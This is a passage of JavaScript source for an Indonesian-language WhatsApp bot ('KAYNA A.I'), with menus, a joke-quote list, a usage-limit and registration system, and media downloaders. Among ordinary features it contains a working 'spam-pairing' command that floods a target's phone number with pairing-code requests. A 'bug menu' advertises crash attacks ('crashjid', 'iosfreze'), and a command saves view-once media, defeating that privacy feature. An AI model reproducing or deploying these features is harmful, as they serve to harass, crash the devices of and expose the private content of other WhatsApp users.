▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧  T O O L S  M E N U
│ • ${prefix}hd Ⓛ︎
│ • ${prefix}remini Ⓛ︎
│ • ${prefix}tourl Ⓛ︎
│ • ${prefix}readviewonce Ⓛ︎
│ • ${prefix}smeme
│ • ${prefix}sticker
└───···
`)
} else if (args[0] === "download") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ D O W N L O A D  M E N U
│ • ${prefix}play Ⓛ︎
│ • ${prefix}tiktokvideo Ⓛ︎
│ • ${prefix}tiktokslide Ⓛ︎
│ • ${prefix}gdrive Ⓛ︎
│ • ${prefix}mediafire Ⓛ︎
│ • ${prefix}sfiledl Ⓛ︎
│ • ${prefix}ytmp4 Ⓛ︎
└───···
`)

} else if (args[0] === "ai") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N* 📖
▧ LIMIT : ${db.data.users[sender].limit}
▧ STATUS USER : ${isPremium ? 'premium' : 'free user'}
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ DATE : ${date}

▧ A I  M E N U
│ • ${prefix}ai on/off
└───···
`)
} else if (args[0] === "group") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ G R O U P  M E N U
│ • ${prefix}afk
│ • ${prefix}hidetag
│ • ${prefix}kick
│ • ${prefix}delete
│ • ${prefix}antilinkgc [ NO KICK ]
└───···
`)
} else if (args[0] === "info") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ I N F O  M E N U
│ • ${prefix}script
│ • ${prefix}ping
└───···
`)
} else if (args[0] === "search") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ S E A R C H  M E N U
│ • ${prefix}play Ⓛ︎
│ • ${prefix}pinterest Ⓛ︎
│ • ${prefix}ytsearch Ⓛ︎
└───···`)
} else if (args[0] === "bug") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ B U G  M E N U
│ • ${prefix}oribug
│ • ${prefix}crashjid
│ • ${prefix}iosfreze
└───···`)
} else if (args[0] === "quotes") {
return replymenu(`hi \`${pushname}\` 👋🏼

${ucapanWaktu}

▧ *I N F O R M A T I O N  U S E R* 📖
▧ \`LIMIT\` : ${db.data.users[sender].limit}
▧ \`STATUS USER\` : ${isPremium ? 'premium' : 'free user'}

▧ *I N F O R M A T I O N  B O T*
▧ Ⓛ︎ = Limit Ⓟ︎ = Premium 
▧ \`BOT NAME\` : KAYNA A.I 
▧ \`TOTAL FITUR\` : ${totalFitur()}
▧ \`RUNTIME\` : ${runtime(process.uptime())}
▧ \`DATE\` : ${date}

▧ Q U O T E S  M E N U 
│ • ${prefix}quotesanime Ⓛ︎
│ • ${prefix}quotesbacot Ⓛ︎
└───···`)
}
}
break
case 'quotesbacot': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
 reply(bacotan)
}
break
case 'quotesanime': {
	if (!users.registered) return reply(mess.daftar)
	if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  uselimit(1)
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  return reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
case 'clearall': {
if (!Creator) return reply(mess.owner)
rukaxriss.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
reaction(m.chat, "✅")
}
break
    case 'totalfitur': {
 return reply(`${totalFitur()}`)
}
break
    case 'claim': case 'daily': {
  if (!users.registered) return reply(mess.daftar)
 let __timers = (new Date - users.lastclaim)
   let _timers = (86400000 - __timers)
   let timers = clockString(_timers)
   if (new Date - users.lastclaim > 86400000) {
   	rukaxriss.sendMessage(m.chat, { text: `*Daily Claim*\n_Successful Claim_\n- limit : 3\n\n_Claim Reset_` }, { quoted: m })
   	users.limit[m.sender].limit += 3
   	users.lastclaim[m.sender].lastclaim = new Date * 1
   } else {
   	rukaxriss.sendMessage(m.chat, { text: `Please wait *⏱️${timers}* again to be able to claim again` }, { quoted: m })
   }
    }
break
case 'scripta': case 'sca': {
let Rawwwwr = `https://chat.whatsapp.com/HCdOZsRFUry20aE5157uhy

*If you want to ask questions, please chat :*
> ${owner}

*Jika ingin Tahu Informasi Mengenai Bot Ini :*
> _https://whatsapp.com/channel/0029VavKx02F1YlaeIiICq1m_

*Jika Ingin Memainkan Bot Ini :*
> _https://chat.whatsapp.com/HCdOZsRFUry20aE5157uhy_`
 rukaxriss.relayMessage(m.chat, {
requestPaymentMessage: {
lcurrencyCodeIso4217: 'IDR',
amount1000: 20000 * 20000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: `${Rawwwwr}`,
contextInfo: {
mentionedJid: ['6289668164759' + '@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: true
}
}
}
}
}
}, {})
}
break
case 'remini': case 'hd': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(mess.wait)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
let leo = {
  image: proses,
  caption: `done by: ${namabot}`,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsaluran,
 newsletterName: `Hd By: ${ownername}`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rukaxriss.decodeJid(rukaxriss.user.id) },
},
}
await rukaxriss.sendMessage(m.chat, leo, { quoted: qpayment });
}
uselimit(1)
break
case 'tqto': {
return reply(`📍 *THANKS TO* 📍\n\n
- ALLAH SWT
- RISSXD ( PENGEMBANG )
- KYUURZY ( BASE )
- PENYEDIA FITUR
- SUPPORTER
- PENYEDIA API`)
}
break
case 'ping': {
if (!users.registered) return reply(mess.daftar)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
            }
            break
case "redeemcode": {
if (!users.registered) return reply(mess.daftar)
if (!args[0]) return reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return reply("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return reply("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
db.data.users[m.sender].limit += 15
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *15 Limit* dari *Code Redeem "${args[0]}"*`
await reply(`Berhasil Mendapatkan *15 Limit* dari *Code Redeem ${args[0]}*`).then(() => {
rukaxriss.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumbnail, title: "© Message System Notifikasi", body: null, sourceUrl: 'https://youtube.com/@rissmdbotz', renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qpayment})
})}
break
case 'daftar': { 
  if (users.registered === true) return reply(`*❕ You are already registered*`)
  if (!text) return reply(`contoh : .daftar nama.umur`)
  let t = text.split('.')
  let name = t[0]
  let age = t[1]
  if (!name) return reply(`nama tidak boleh kosong`)
  if (!age) return reply(`umur tidak boleh kosong`)
  if (isNaN(age)) return reply(`umur tidak valid`)
  age = parseInt(age);
  if (age > 50) return m.reply('Maximum Age *50* years')
  if (age < 5) return m.reply('Minimum Age *5* years')
  if (name.split('').length > 100) return m.reply('Nama Maksimal 100 Karakter Ajg')
  let sn = generateRandomPassword(10)
  users.nick = name.trim()
  users.age = age
  users.registered = true
  users.limit += 30
  users.sn = sn
  users.regTime = +new Date
    
 reply(`
┏─• *USER*
│◉ *sᴛᴀᴛᴜs:* ☑️ sᴜᴄᴄᴇssғᴜʟ
│◉ *ɴᴀᴍᴇ:* ${name}
│◉ *ᴀɢᴇ:* ${age} ʏᴇᴀʀs
┗───•
 ◉ *SN:* ${sn}
 ◉ *LIMIT:* + 30 BONUS AWAL
`)
}
break
case 'ceksn': {
if (!users.registered) return reply(mess.daftar)
await uselimit(1)
return reply(`${users.sn}`)
}
break
case 'unregister': {
  if (!args[0]) return reply(`*• Example:* ${prefix + command} *[Serial number]*`)
  let user = global.db.data.users[m.sender]
  if (args[0] !== users.sn) return reply('*[ x ] Invalid serial number*')
   let __waktuh = (new Date - global.db.data.users[m.sender].regTime)
   let _waktuh = (+ 86400000 - __waktuh)
   let waktuh = clockString(_waktuh)
  /* if (new Date - global.db.data.users[m.sender].unreglast > + 86400000) {*/
   user.regTime = new Date * 1
  user.registered = false
  user.age = 0
  user.limit = 0
  m.reply(`[ ✓ ] Unregister successful!`)
 /* } else m.reply(`[ x ] You have *${prefix + command}*.\nPlease wait *${time}* to get *${prefix + command}* back.`)*/
}
break        
case 'ceklimit': {
pengguna
let a = db.data.users[m.sender]
reply(`*YOUR LIMIT IS IN AMOUNT ${a.limit} LIMIT*`)
}
break
case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
}

            break
case 'request': case 'reportbug': {
    if (!users.registered) return reply(mess.daftar)
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
               rukaxriss.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            rukaxriss.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
break        
case "joingc": case "join": {
if (!Creator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`*Example:* ${prefix + command} Url Link Group`)
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Invalid Link!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await rukaxriss.groupAcceptInvite(result).then(respon => reply("* Successfully Entered Into Group Chat")).catch(error => reply(error.toString()))
}
break  
case 'customsn': {
if (!Creator) return reply(`khusus rissXD Anjir`)
if (!text) return reply(`example : .customsn +6281**|rissxd`)
let t = text.split('|')
let nomor = t[0]
let serial = t[1]
let oo = `${nomor}@s.whatsapp.net`
global.db.data.users[oo].sn = serial
return reply(`berhasil diubah menjadi ${serial}`)
}
break
case 'restart':
if (!Creator) return reply(mess.owner)
await m.reply('Restart...')
process.exit()
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!text) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(text)
reply(`Success
${meg.result}`)
}
break        
case 'database': {
if (!Creator) return reply(mess.owner)
totalregg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    reply(`*${totalregg} users using Bot*`)
}
break 
case "listhadiah": {
if (!Creator) return reply(mess.owner)
if (db.data.settings.hadiah.length < 1) return reply("Tidak ada code hadiah")
var teks = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\nKetik .redeemcode <kode> Untuk Redeem Code`
db.data.settings.hadiah.forEach((e) => {
teks += ` ◦ ${e}\n`
})
reply(teks)
}
break
case "buathadiah": {
if (!Creator) return reply(mess.owner)
if (isNaN(args[0])) return reply('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
reply(teks)
}
break
case 'clearsession': {
                if (!Creator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
case 'bcgc': case 'bcgroup': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await rukaxriss.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
rukaxriss.sendMessage(i, {text: `${text}`}, {quoted:rissxdsaluran})
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "backup":{
if (!Creator) return reply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await rukaxriss.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        
case 'public': {
if (!Creator) return reply(`khusus riss saja`)
rukaxriss.public = true
reply('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!Creator) return reply(`khusus riss saja`)
rukaxriss.public = false
reply('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break
case 'spam-pairing': {
if (!Creator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(mess.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
case 'addlimit': {
                if (!Creator) return reply(`khusus rissxd loh cik`)
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                let usernya = text.split('|')[0]
                let limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                global.db.data.users[oo].limit += parseInt(limitnya)
                reply(`done`)
}
break        
case 'rvo':
case 'readviewonce': {
	if (!users.registered) return reply(mess.daftar)
	if (users.limit < 10) return reply(`[ ! ] LIMITMU KURANG DARI 10`)
    uselimit(10)
	if (!m.quoted) return reply(`Balas untuk melihat pesan sekali`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return rukaxriss.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return rukaxriss.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break        
case 'smeme': {
    if (!users.registered) return reply(mess.daftar)
    let [atas, bawah] = text.split`|`
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    if (!mime) return reply(`balas gambar dengan perintah\n\n${prefix + command} <${atas ? atas : 'teks atas'}>|<${bawah ? bawah : 'teks bawah'}>`)
    reply(global.mess.wait)
    if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*Mime ${mime} tidak didukung!*_`)
    let img = await q.download()
    let url = await uploadImage(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    rukaxriss.sendImageAsSticker(m.chat, meme, qsticker, { packname: packname, author: author })

}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!users.registered) return reply(mess.daftar)
 if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
reply(`Sedang Proses Permintaan...`)
let media = await quoted.download()
let encmedia = await rukaxriss.sendImageAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await rukaxriss.sendVideoAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break   
case 'getidch': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!m.quoted) return m.reply('reply saluran channel nya lah')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`Name: ${id.newsletterName}\nId: ${id.newsletterJid}`)
} catch (e) {
m.reply('Harus chat dari channel bang')
}
}
uselimit(1)
break        
case 'tourl': {
 if (!users.registered) return reply(mess.daftar)
 if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  uselimit(1)
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return reply('Tidak ada media yang ditemukan')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let fileSizeLimit = 5 * 1024 * 1024 
  if (media.length > fileSizeLimit) {
    return reply(`Ukuran media tidak boleh melebihi 5MB`)
  }
  let link = await (isTele ? uploadImage : uploadFile)(media)
  replyy(`▧ INI LOH CIK😋

│ • ${link}

${media.length} Byte(s)
${isTele ? '(Tidak Ada Tanggal Kedaluwarsa)' : '(Expired 24 hours)'}`)
}

			break
case 'yts': case 'ytsearch': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
rukaxriss.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: qpayment })
            }
  uselimit(1)
            break
case "play": {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return reply(`*Example:* ${prefix + command} photograph`)
await reaction(m.chat, "⏳");
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
rukaxriss.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "kiuu.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
uselimit(1)
}
break
case "ytmp4": {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return reply(`*Example:* ${prefix + command} *link*`)
await reaction(m.chat, "⏳");
var response = await ytdl(text)
var puki = response.data.mp4
rukaxriss.sendMessage(m.chat, { video: { url: puki },
mimetype: "video/mp4",
fileName: "kiuu.mp4",
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namasaluran,
newsletterJid: `${global.idsaluran}`,
},
externalAdReply: {
showAdAttribution: true,
title: 'Click To Be Subscribe',
sourceUrl: 'https://youtube.com/@rissmdbotz',
thumbnailUrl: thumbnail,
}}},{quoted:m})
uselimit(1)
}
break
case 'tovn': {
if (!terdaftar) return reply(global.mess.daftar)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`reply video/vn with caption ${prefix + command}`)
if (!quoted) return m.reply(`reply video/vn with caption ${prefix + command}`)
await reaction(m.chat, "🔒");
await sleep(5000)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
await reaction(m.chat, "🔓");
rukaxriss.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
break
case 'mediafire': case 'mf': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text.includes('mediafire.com')) return reply(`• *Example :* .${command} https://www.mediafire.com/file/xxxxxxx/`)

async function mf(url) {
    return new Promise(async (resolve, reject) => {
        try {
            const response = await require("undici").fetch(url);
            const data = await response.text();
            const $ = cheerio.load(data);
            
            let name = $('.dl-info > div > div.filename').text();
            let link = $('#downloadButton').attr('href');
          let det = $('ul.details').html().replace(/\s/g, "").replace(/<\/li><li>/g, '\n').replace(/<\/?li>|<\/?span>/g, '');
            let type = $('.dl-info > div > div.filetype').text();

        

            const hasil = {
                filename: name,
                filetype: type,
                link: link,
                detail: det
            };

            resolve(hasil);
        } catch (err) {
            console.error(err);
            reject(err);
        }
    });
}

const sendReaction = async reactionContent => {
  rukaxriss.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

try {
let { filename, filetype, link, detail } = await mf(text)
let mfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
